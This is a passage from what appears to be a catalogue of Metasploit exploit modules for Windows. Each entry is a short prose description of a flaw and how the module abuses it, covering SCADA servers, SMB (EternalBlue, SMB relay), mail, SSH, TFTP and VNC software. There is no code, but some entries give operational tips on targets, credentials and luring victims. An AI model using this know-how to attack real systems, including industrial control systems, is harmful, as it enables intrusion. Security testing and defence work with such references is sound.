This module exploits a lack of authentication and authorization on the InduSoft Web Studio Remote Agent, that allows a remote attacker to write arbitrary files to the filesystem, by abusing the functions provided by the software. The module uses the Windows Management Instrumentation service to execute an arbitrary payload on vulnerable installations of InduSoft Web Studio on Windows pre Vista. It has been successfully tested on InduSoft Web Studio 6.1 SP6 over Windows XP SP3 and Windows 2003 SP2.

windows/scada/moxa_mdmtool
This module exploits a stack buffer overflow in MOXA MDM Tool 2.1. When sending a specially crafted MDMGw (MDM2_Gateway) response, an attacker may be able to execute arbitrary code.

windows/scada/procyon_core_server
This module exploits a vulnerability in the coreservice.exe component of Proycon Core Server <= v1.13. While processing a password, the application fails to do proper bounds checking before copying data into a small buffer on the stack. This causes a buffer overflow and allows to overwrite a structured exception handling record on the stack, allowing for unauthenticated remote code execution. Also, after the payload exits, Coreservice.exe should automatically recover.

windows/scada/realwin
This module exploits a stack buffer overflow in DATAC Control International RealWin SCADA Server 2.0 (Build 6.0.10.37). By sending a specially crafted FC_INFOTAG/SET_CONTROL packet, an attacker may be able to execute arbitrary code.

windows/scada/realwin_on_fc_binfile_a
This module exploits a vulnerability found in DATAC Control International RealWin SCADA Server 2.1 and below. By supplying a specially crafted On_FC_BINFILE_FCS_*FILE packet via port 910, RealWin will try to create a file (which would be saved to C:\Program Files\DATAC\Real Win\RW-version\filename) by first copying the user- supplied filename with an inline memcpy routine without proper bounds checking, which results a stack-based buffer overflow, allowing arbitrary remote code execution. Tested version: 2.0 (Build 6.1.8.10)

windows/scada/realwin_on_fcs_login
This module exploits a stack buffer overflow in DATAC Control International RealWin SCADA Server 2.1 (Build 6.0.10.10) or earlier. By sending a specially crafted On_FC_CONNECT_FCS_LOGIN packet containing a long username, an attacker may be able to execute arbitrary code.

windows/scada/rockwell_factorytalk_rce
This module exploits a series of vulnerabilities to achieve unauthenticated remote code execution on the Rockwell FactoryTalk View SE SCADA product as the IIS user. The attack relies on the chaining of five separate vulnerabilities. The first vulnerability is an unauthenticated project copy request, the second is a directory traversal, and the third is a race condition. In order to achieve full remote code execution on all targets, two information leak vulnerabilities are also abused. This exploit was used by the Flashback team (Pedro Ribeiro + Radek Domanski) in Pwn2Own Miami 2020 to win the EWS category.

windows/scada/scadapro_cmdexe
This module allows remote attackers to execute arbitrary commands on the affected system by abusing via Directory Traversal attack when using the 'xf' command (execute function).

windows/sip/sipxphone_cseq
This module exploits a buffer overflow in SIPfoundry's sipXphone 2.6.0.27. By sending an overly long CSeq value, a remote attacker could overflow a buffer and execute arbitrary code on the system with the privileges of the affected application.

windows/smb/cve_2020_0796_smbghost
A vulnerability exists within the Microsoft Server Message Block 3.1.1 (SMBv3) protocol that can be leveraged to execute code on a vulnerable server. This remove exploit implementation leverages this flaw to execute code in the context of the kernel, finally yielding a session as NT AUTHORITY\SYSTEM in spoolsv.exe. Exploitation can take a few minutes as the necessary data is gathered.

windows/smb/generic_smb_dll_injection
This is a general-purpose module for exploiting conditions where a DLL can be loaded from a specified SMB share. This module serves payloads as DLLs over an SMB service.

windows/smb/group_policy_startup
This is a general-purpose module for exploiting systems with Windows Group Policy configured to load VBS startup/logon scripts from remote locations. This module runs a SMB shared resource that will provide a payload through a VBS file. Startup scripts will be executed with SYSTEM privileges, while logon scripts will be executed with the user privileges. Have into account which the attacker still needs to redirect the target traffic to the fake SMB share to exploit it successfully. Please note in some cases, it will take 5 to 10 minutes to receive a session.

windows/smb/ipass_pipe_exec
This module exploits a vulnerability in the IPass Client service. This service provides a named pipe which can be accessed by the user group BUILTIN\Users. This pipe can be abused to force the service to load a DLL from a SMB share.

windows/smb/ms03_049_netapi
This module exploits a stack buffer overflow in the NetApi32 NetAddAlternateComputerName function using the Workstation service in Windows XP.

windows/smb/ms04_007_killbill
This is an exploit for a previously undisclosed vulnerability in the bit string decoding code in the Microsoft ASN.1 library. This vulnerability is not related to the bit string vulnerability described in eEye advisory AD20040210-2. Both vulnerabilities were fixed in the MS04-007 patch. Windows 2000 SP4 Rollup 1 also patches this vulnerability. You are only allowed one attempt with this vulnerability. If the payload fails to execute, the LSASS system service will crash and the target system will automatically reboot itself in 60 seconds. If the payload succeeds, the system will no longer be able to process authentication requests, denying all attempts to login through SMB or at the console. A reboot is required to restore proper functioning of an exploited system. This exploit has been successfully tested with the win32/*/reverse_tcp payloads, however a few problems were encountered when using the equivalent bind payloads. Your mileage may vary.

windows/smb/ms04_011_lsass
This module exploits a stack buffer overflow in the LSASS service, this vulnerability was originally found by eEye. When re-exploiting a Windows XP system, you will need need to run this module twice. DCERPC request fragmentation can be performed by setting 'FragSize' parameter.

windows/smb/ms04_031_netdde
This module exploits a stack buffer overflow in the NetDDE service, which is the precursor to the DCOM interface. This exploit effects only operating systems released prior to Windows XP SP1 (2000 SP4, XP SP0). Despite Microsoft's claim that this vulnerability can be exploited without authentication, the NDDEAPI pipe is only accessible after successful authentication.

windows/smb/ms05_039_pnp
This module exploits a stack buffer overflow in the Windows Plug and Play service. This vulnerability can be exploited on Windows 2000 without a valid user account. NOTE: Since the PnP service runs inside the service.exe process, a failed exploit attempt will cause the system to automatically reboot.

windows/smb/ms06_025_rasmans_reg
This module exploits a registry-based stack buffer overflow in the Windows Routing and Remote Access Service. Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well. A valid username and password is required to exploit this flaw on Windows 2000. When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'. Exploiting this flaw involves two distinct steps - creating the registry key and then triggering an overwrite based on a read of this key. Once the key is created, it cannot be recreated. This means that for any given system, you only get one chance to exploit this flaw. Picking the wrong target will require a manual removal of the following registry key before you can try again: HKEY_USERS\.DEFAULT\Software\Microsoft\RAS Phonebook

windows/smb/ms06_025_rras
This module exploits a stack buffer overflow in the Windows Routing and Remote Access Service. Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well. A valid username and password is required to exploit this flaw on Windows 2000. When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.

windows/smb/ms06_040_netapi
This module exploits a stack buffer overflow in the NetApi32 CanonicalizePathName() function using the NetpwPathCanonicalize RPC call in the Server Service. It is likely that other RPC calls could be used to exploit this service. This exploit will result in a denial of service on Windows XP SP2 or Windows 2003 SP1. A failed exploit attempt will likely result in a complete reboot on Windows 2000 and the termination of all SMB-related services on Windows XP. The default target for this exploit should succeed on Windows NT 4.0, Windows 2000 SP0-SP4+, Windows XP SP0-SP1 and Windows 2003 SP0.

windows/smb/ms06_066_nwapi
This module exploits a stack buffer overflow in the svchost service when the netware client service is running. This specific vulnerability is in the nwapi32.dll module.

windows/smb/ms06_066_nwwks
This module exploits a stack buffer overflow in the svchost service, when the netware client service is running. This specific vulnerability is in the nwapi32.dll module.

windows/smb/ms06_070_wkssvc
This module exploits a stack buffer overflow in the NetApi32 NetpManageIPCConnect function using the Workstation service in Windows 2000 SP4 and Windows XP SP2. In order to exploit this vulnerability, you must specify the name of a valid Windows DOMAIN. It may be possible to satisfy this condition by using a custom DNS and LDAP setup, however that method is not covered here. Although Windows XP SP2 is vulnerable, Microsoft reports that Administrator credentials are required to reach the vulnerable code. Windows XP SP1 only requires valid user credentials. Also, testing shows that a machine already joined to a domain is not exploitable.

windows/smb/ms07_029_msdns_zonename
This module exploits a stack buffer overflow in the RPC interface of the Microsoft DNS service. The vulnerability is triggered when a long zone name parameter is supplied that contains escaped octal strings. This module is capable of bypassing NX/DEP protection on Windows 2003 SP1/SP2. This module exploits the RPC service using the \DNSSERVER pipe available via SMB. This pipe requires a valid user account to access, so the SMBUSER and SMBPASS options must be specified.

windows/smb/ms08_067_netapi
This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service. This module is capable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along with a dozen others in the same process) from crashing. Windows XP targets seem to handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This is just the first version of this module, full support for NX bypass on 2003, along with other platforms, is still in development.

windows/smb/ms09_050_smb2_negotiate_func_index
This module exploits an out of bounds function table dereference in the SMB request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7 release candidates (not RTM), and Windows 2008 Server prior to R2. Windows Vista without SP1 does not seem affected by this flaw.

windows/smb/ms10_046_shortcut_icon_dllloader
This module exploits a vulnerability in the handling of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious DLL. This creates an SMB resource to provide the payload inside a DLL, and generates a LNK file which must be sent to the target.

windows/smb/ms10_061_spoolss
This module exploits the RPC service impersonation vulnerability detailed in Microsoft Bulletin MS10-061. By making a specific DCE RPC request to the StartDocPrinter procedure, an attacker can impersonate the Printer Spooler service to create a file. The working directory at the time is %SystemRoot%\system32. An attacker can specify any file name, including directory traversal or full paths. By sending WritePrinter requests, an attacker can fully control the content of the created file. In order to gain code execution, this module writes to a directory used by Windows Management Instrumentation (WMI) to deploy applications. This directory (Wbem\Mof) is periodically scanned and any new .mof files are processed automatically. This is the same technique employed by the Stuxnet code found in the wild.

windows/smb/ms15_020_shortcut_icon_dllloader
This module exploits a vulnerability in the MS10-046 patch to abuse (again) the handling of Windows Shortcut files (.LNK) that contain an icon resource pointing to a malicious DLL. This creates an SMB resource to provide the payload and the trigger, and generates a LNK file which must be sent to the target. This module has been tested successfully on Windows 2003 SP2 with MS10-046 installed and Windows 2008 SP2 (32 bits) with MS14-027 installed.

windows/smb/ms17_010_eternalblue
This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.

windows/smb/ms17_010_psexec
This module will exploit SMB with vulnerabilities in MS17-010 to achieve a write-what-where primitive. This will then be used to overwrite the connection session information with as an Administrator session. From there, the normal psexec payload code execution is done. Exploits a type confusion between Transaction and WriteAndX requests and a race condition in Transaction requests, as seen in the EternalRomance, EternalChampion, and EternalSynergy exploits. This exploit chain is more reliable than the EternalBlue exploit, but requires a named pipe.

windows/smb/netidentity_xtierrpcpipe
This module exploits a stack buffer overflow in Novell's NetIdentity Agent. When sending a specially crafted string to the 'XTIERRPCPIPE' named pipe, an attacker may be able to execute arbitrary code. The success of this module is much greater once the service has been restarted.

windows/smb/psexec
This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description.

windows/smb/smb_delivery
This module serves payloads via an SMB server and provides commands to retrieve and execute the generated payloads. Currently supports DLLs and Powershell.

windows/smb/smb_doublepulsar_rce
This module executes a Metasploit payload against the Equation Group's DOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE. While this module primarily performs code execution against the implant, the "Neutralize implant" target allows you to disable the implant.

windows/smb/smb_relay
This module will relay SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system must try to authenticate to this module. The easiest way to force a SMB authentication attempt is by embedding a UNC path (\SERVER\SHARE) into a web page or email message. When the victim views the web page or email, their system will automatically connect to the server specified in the UNC share (the IP address of the system running this module) and attempt to authenticate. Unfortunately, this module is not able to clean up after itself. The service and payload file listed in the output will need to be manually removed after access has been gained. The service created by this tool uses a randomly chosen name and description, so the services list can become cluttered after repeated exploitation. The SMB authentication relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia. On November 11th 2008 Microsoft released bulletin MS08-068. This bulletin includes a patch which prevents the relaying of challenge keys back to the host which issued them, preventing this exploit from working in the default configuration. It is still possible to set the SMBHOST parameter to a third-party host that the victim is authorized to access, but the "reflection" attack has been effectively broken. As of Feb 2022 - this module does not support SMB 1.

windows/smb/smb_rras_erraticgopher
This module exploits an overflow in the Windows Routing and Remote Access Service (RRAS) to execute code as SYSTEM. The RRAS DCERPC endpoint is accessible to unauthenticated users via SMBv1 browser named pipe on Windows Server 2003 and Windows XP hosts; however, this module targets Windows Server 2003 only. Since the service is hosted inside svchost.exe, a failed exploit attempt can cause other system services to fail as well. The module has been successfully tested on: Windows Server 2003 SP0 (x86); Windows Server 2003 SP1 (x86); Windows Server 2003 SP2 (x86); and Windows Server 2003 R2 SP2 (x86).

windows/smb/smb_shadow
This module will intercept direct SMB authentication requests to another host, gaining access to an authenticated SMB session if successful. If the connecting user is an administrator and network logins are allowed to the target machine, this module will execute an arbitrary payload. To exploit this, the target system must try to autheticate to another host on the local area network. SMB Direct Session takeover is a combination of previous attacks. This module is dependent on an external ARP spoofer. The builtin ARP spoofer was not providing sufficient host discovery. Bettercap v1.6.2 was used during the development of this module. The original SMB relay attack was first reported by Sir Dystic on March 31st, 2001 at @lanta.con in Atlanta, Georgia.

windows/smb/timbuktu_plughntcommand_bof
This module exploits a stack based buffer overflow in Timbuktu Pro version <= 8.6.6 in a pretty novel way. This exploit requires two connections. The first connection is used to leak stack data using the buffer overflow to overwrite the nNumberOfBytesToWrite argument. By supplying a large value for this argument it is possible to cause Timbuktu to reply to the initial request with leaked stack data. Using this data allows for reliable exploitation of the buffer overflow vulnerability. Props to Infamous41d for helping in finding this exploitation path. The second connection utilizes the data from the data leak to accurately exploit the stack based buffer overflow vulnerability. TODO: hdm suggested using meterpreter's migration capability and restarting the process for multishot exploitation.

windows/smb/webexec
This module uses a valid username and password of any level (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" module, except allows any non-guest account by default.

windows/smtp/mailcarrier_smtp_ehlo
This module exploits the MailCarrier v2.51 suite SMTP service. The stack is overwritten when sending an overly long EHLO command.

windows/smtp/mercury_cram_md5
This module exploits a stack buffer overflow in Mercury Mail Transport System 4.51. By sending a specially crafted argument to the AUTH CRAM-MD5 command, an attacker may be able to execute arbitrary code.

windows/smtp/ms03_046_exchange2000_xexch50
This is an exploit for the Exchange 2000 heap overflow. Due to the nature of the vulnerability, this exploit is not very reliable. This module has been tested against Exchange 2000 SP0 and SP3 running a Windows 2000 system patched to SP4. It normally takes between one and 100 connection attempts to successfully obtain a shell. This exploit is *very* unreliable.

windows/smtp/njstar_smtp_bof
This module exploits a stack buffer overflow vulnerability in NJStar Communicator Version 3.00 MiniSMTP server. The MiniSMTP application can be seen in multiple NJStar products, and will continue to run in the background even if the software is already shutdown. According to the vendor's testimonials, NJStar software is also used by well known companies such as Siemens, NEC, Google, Yahoo, eBay; government agencies such as the FBI, Department of Justice (HK); as well as a long list of universities such as Yale, Harvard, University of Tokyo, etc.

windows/smtp/sysgauge_client_bof
This module will setup an SMTP server expecting a connection from SysGauge 1.5.18 via its SMTP server validation. The module sends a malicious response along in the 220 service ready response and exploits the client, resulting in an unprivileged shell.

windows/smtp/wmailserver
This module exploits a stack buffer overflow in SoftiaCom WMailserver 1.0 (SMTP) via a SEH frame overwrite.

windows/smtp/ypops_overflow1
This module exploits a stack buffer overflow in the YPOPS POP3 service. This is a classic stack buffer overflow for YPOPS version 0.6. Possibly Affected version 0.5, 0.4.5.1, 0.4.5. Eip point to jmp ebx opcode in ws_32.dll

windows/ssh/freeftpd_key_exchange
This module exploits a simple stack buffer overflow in FreeFTPd 1.0.10 This flaw is due to a buffer overflow error when handling a specially crafted key exchange algorithm string received from an SSH client. This module is based on MC's freesshd_key_exchange exploit.

windows/ssh/freesshd_authbypass
This module exploits a vulnerability found in FreeSSHd <= 1.2.6 to bypass authentication. You just need the username (which defaults to root). The exploit has been tested with both password and public key authentication.

windows/ssh/freesshd_key_exchange
This module exploits a simple stack buffer overflow in FreeSSHd 1.0.9. This flaw is due to a buffer overflow error when handling a specially crafted key exchange algorithm string received from an SSH client.

windows/ssh/putty_msg_debug
This module exploits a buffer overflow in the PuTTY SSH client that is triggered through a validation error in SSH.c. This vulnerability affects versions 0.53 and earlier.

windows/ssh/securecrt_ssh1
This module exploits a buffer overflow in SecureCRT <= 4.0 Beta 2. By sending a vulnerable client an overly long SSH1 protocol identifier string, it is possible to execute arbitrary code. This module has only been tested on SecureCRT 3.4.4.

windows/ssh/sysax_ssh_username
This module exploits a vulnerability found in Sysax's SSH service. By supplying a long username, the SSH server will copy that data on the stack without proper bounds checking, therefore allowing remote code execution under the context of the user. Please note that previous versions (before 5.53) are also affected by this bug.

windows/ssl/ms04_011_pct
This module exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack. This code is based on Johnny Cyberpunk's THC release and has been tested against Windows 2000 and Windows XP. To use this module, specify the remote port of any SSL service, or the port and protocol of an application that uses SSL. The only application protocol supported at this time is SMTP. You only have one chance to select the correct target, if you are attacking IIS, you may want to try one of the other exploits first (WebDAV). If WebDAV does not work, this more than likely means that this is either Windows 2000 SP4+ or Windows XP (IIS 5.0 vs IIS 5.1). Using the wrong target may not result in an immediate crash of the remote system.

windows/telnet/gamsoft_telsrv_username
This module exploits a username sprintf stack buffer overflow in GAMSoft TelSrv 1.5. Other versions may also be affected. The service terminates after exploitation, so you only get one chance!

windows/telnet/goodtech_telnet
This module exploits a stack buffer overflow in GoodTech Systems Telnet Server versions prior to 5.0.7. By sending an overly long string, an attacker can overwrite the buffer and control program execution.

windows/tftp/attftp_long_filename
This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a request (get/write) for an overly long file name.

windows/tftp/distinct_tftp_traversal
This module exploits a directory traversal vulnerability in the TFTP Server component of Distinct Intranet Servers version 3.10 which allows a remote attacker to write arbitrary files to the server file system, resulting in code execution under the context of 'SYSTEM'. This module has been tested successfully on TFTP Server version 3.10 on Windows XP SP3 (EN).

windows/tftp/dlink_long_filename
This module exploits a stack buffer overflow in D-Link TFTP 1.0. By sending a request for an overly long file name, an attacker could overflow a buffer and execute arbitrary code. For best results, use bind payloads with nonx (No NX).

windows/tftp/futuresoft_transfermode
This module exploits a stack buffer overflow in the FutureSoft TFTP Server 2000 product. By sending an overly long transfer-mode string, we were able to overwrite both the SEH and the saved EIP. A subsequent write-exception that will occur allows the transferring of execution to our shellcode via the overwritten SEH. This module has been tested against Windows 2000 Professional and for some reason does not seem to work against Windows 2000 Server (could not trigger the overflow at all).

windows/tftp/netdecision_tftp_traversal
This module exploits a vulnerability found in NetDecision 4.2 TFTP server. The software contains a directory traversal vulnerability that allows a remote attacker to write arbitrary file to the file system, which results in code execution under the context of user executing the TFTP Server.

windows/tftp/opentftp_error_code
This module exploits a buffer overflow in OpenTFTP Server SP 1.4. The vulnerable condition triggers when the TFTP opcode is configured as an error packet, the TFTP service will then format the message using a sprintf() function, which causes an overflow, therefore allowing remote code execution under the context of SYSTEM. The offset (to EIP) is specific to how the TFTP was started (as a 'Stand Alone', or 'Service'). By default the target is set to 'Service' because that's the default configuration during OpenTFTP Server SP 1.4's installation.

windows/tftp/quick_tftp_pro_mode
This module exploits a stack buffer overflow in the Quick TFTP Pro server product. MS Update KB926436 screws up the opcode address being used in oledlg.dll resulting in a DoS. This is a port of a sploit by Mati "muts" Aharoni.

windows/tftp/tftpd32_long_filename
This module exploits a stack buffer overflow in TFTPD32 version 2.21 and prior. By sending a request for an overly long file name to the tftpd32 server, a remote attacker could overflow a buffer and execute arbitrary code on the system.

windows/tftp/tftpdwin_long_filename
This module exploits the ProSysInfo TFTPDWIN threaded TFTP Server. By sending an overly long file name to the tftpd.exe server, the stack can be overwritten.

windows/tftp/tftpserver_wrq_bof
This module exploits a vulnerability found in TFTP Server 1.4 ST. The flaw is due to the way TFTP handles the filename parameter extracted from a WRQ request. The server will append the user-supplied filename to TFTP server binary's path without any bounds checking, and then attempt to check this path with a fopen(). Since this isn't a valid file path, fopen() returns null, which allows the corrupted data to be used in a strcmp() function, causing an access violation. Since the offset is sensitive to how the TFTP server is launched, you must know in advance if your victim machine launched the TFTP as a 'Service' or 'Standalone' , and then manually select your target accordingly. A successful attempt will lead to remote code execution under the context of SYSTEM if run as a service, or the user if run as a standalone. A failed attempt will result a denial-of-service.

windows/tftp/threectftpsvc_long_mode
This module exploits a stack buffer overflow in 3CTftpSvc 2.0.1. By sending a specially crafted packet with an overly long mode field, a remote attacker could overflow a buffer and execute arbitrary code on the system.

windows/unicenter/cam_log_security
This module exploits a vulnerability in the CA CAM service by passing a long parameter to the log_security() function. The CAM service is part of TNG Unicenter. This module has been tested on Unicenter v3.1.

windows/vnc/realvnc_client
This module exploits a buffer overflow in RealVNC 3.3.7 (vncviewer.exe).

windows/vnc/ultravnc_client
This module exploits a buffer overflow in UltraVNC Win32 Viewer 1.0.1 Release.

windows/vnc/ultravnc_viewer_bof
This module exploits a buffer overflow in UltraVNC Viewer 1.0.2 Release. If a malicious server responds to a client connection indicating a minor protocol version of 14 or 16, a 32-bit integer is subsequently read from the TCP stream by the client and directly provided as the trusted size for further reading from the TCP stream into a 1024-byte character array on the stack.

windows/vnc/winvnc_http_get
This module exploits a buffer overflow in the AT&T WinVNC version <= v3.3.3r7 web server. When debugging mode with logging is enabled (non-default), an overly long GET request can overwrite the stack. This exploit does not work well with VNC payloads!

windows/vpn/safenet_ike_11
This module exploits a stack buffer overflow in Safenet SoftRemote IKE IreIKE.exe service. When sending a specially crafted udp packet to port 62514 an attacker may be able to execute arbitrary code. This module has been tested with Juniper NetScreen-Remote 10.8.0 (Build 20) using windows/meterpreter/reverse_ord_tcp payloads.

windows/winrm/winrm_script_exec
This module uses valid credentials to login to the WinRM service and execute a payload. It has two available methods for payload delivery: Powershell 2 (and above) and VBS CmdStager. The module will check if Powershell is available, and if so uses that method. Otherwise it falls back to the VBS CmdStager which is less stealthy.

windows/wins/ms04_045_wins
This module exploits an arbitrary memory write flaw in the WINS service. This exploit has been tested against Windows 2000 only.
